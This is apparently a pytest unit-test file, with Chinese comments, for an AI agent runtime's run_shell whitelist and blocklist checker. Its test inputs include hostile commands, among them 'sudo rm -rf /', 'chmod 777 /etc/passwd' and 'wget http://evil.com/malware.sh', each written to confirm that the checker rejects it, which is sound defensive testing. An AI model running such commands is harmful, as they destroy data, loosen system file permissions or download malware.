"""run_shell 白名单扩展单测：白名单内/黑名单/未注册命令拒绝。"""

from agent_runtime.security import (
    SHELL_COMMAND_BLOCKLIST,
    SHELL_COMMAND_WHITELIST,
    check_shell_command,
)


class TestShellCommandWhitelist:
    def test_pytest_allowed(self):
        allowed, reason = check_shell_command("pytest tests/ -v")
        assert allowed is True
        assert "whitelist" in reason

    def test_python_allowed(self):
        allowed, _ = check_shell_command("python -m pytest")
        assert allowed is True

    def test_git_allowed(self):
        allowed, _ = check_shell_command("git status")
        assert allowed is True

    def test_ls_allowed(self):
        allowed, _ = check_shell_command("ls -la")
        assert allowed is True


class TestShellCommandBlocklist:
    def test_sudo_blocked(self):
        allowed, reason = check_shell_command("sudo rm -rf /")
        assert allowed is False
        assert "blocked" in reason

    def test_chmod_blocked(self):
        allowed, _ = check_shell_command("chmod 777 /etc/passwd")
        assert allowed is False

    def test_ssh_blocked(self):
        allowed, _ = check_shell_command("ssh user@evil.com")
        assert allowed is False

    def test_docker_blocked(self):
        allowed, _ = check_shell_command("docker run alpine")
        assert allowed is False


class TestShellCommandUnknown:
    def test_unknown_command_rejected(self):
        """未在黑白名单中的命令保守拒绝。"""
        allowed, reason = check_shell_command("terraform apply")
        assert allowed is False
        assert "not in whitelist" in reason

    def test_empty_command_rejected(self):
        allowed, _ = check_shell_command("")
        assert allowed is False

    def test_whitespace_command_rejected(self):
        allowed, _ = check_shell_command("   ")
        assert allowed is False


class TestWhitelistBlocklistOverlap:
    def test_wget_in_blocklist_not_whitelist(self):
        """wget 在黑名单而非白名单（优先拒绝）。"""
        assert "wget" in SHELL_COMMAND_BLOCKLIST
        assert "wget" in SHELL_COMMAND_WHITELIST or "wget" not in SHELL_COMMAND_WHITELIST
        # 黑名单优先
        allowed, reason = check_shell_command("wget http://evil.com/malware.sh")
        assert allowed is False
        assert "blocked" in reason

    def test_curl_in_whitelist(self):
        """curl 在白名单中。"""
        assert "curl" in SHELL_COMMAND_WHITELIST
        allowed, _ = check_shell_command("curl --version")
        assert allowed is True


class TestToolsRunShellIntegration:
    def test_allowed_command_executes(self, temp_workspace):
        """白名单命令正常执行。"""
        from agent_runtime.tool_context import ToolContext
        from agent_runtime.tools import build_tool_registry

        ctx = ToolContext(root=str(temp_workspace))
        registry = build_tool_registry(ctx)
        result = registry["run_shell"]["run"]({"command": "echo hello"})
        assert "hello" in result

    def test_blocked_command_rejected(self, temp_workspace):
        """黑名单命令被 tool_run_shell 拒绝。"""
        from agent_runtime.tool_context import ToolContext
        from agent_runtime.tools import build_tool_registry

        ctx = ToolContext(root=str(temp_workspace))
        registry = build_tool_registry(ctx)
        result = registry["run_shell"]["run"]({"command": "sudo ls"})
        assert "安全策略拒绝" in result or "blocked" in result
